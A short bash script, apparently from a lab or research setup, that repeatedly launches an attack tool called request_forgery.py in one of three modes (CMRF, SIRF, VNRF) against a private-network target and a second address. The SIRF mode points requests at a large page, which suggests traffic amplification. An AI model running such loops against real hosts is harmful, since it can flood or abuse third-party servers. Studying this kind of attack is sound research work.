#!/bin/bash


#Execute Attack

#CMRF
#CMD="timeout -sINT 3m python3 request_forgery.py cm -e -t 1337 192.168.217.131 123.123.123.123"
 
#SIRF
CMD="timeout -sINT 5s python3 request_forgery.py si -e -H www.example.com -p /large.html -t 1337 192.168.217.131 123.123.123.123"

#VNRF
#CMD="python3 request_forgery.py vn -t 1337 192.168.217.131 123.123.123.123 &"


for i in {1..10} 
do
	$CMD
done

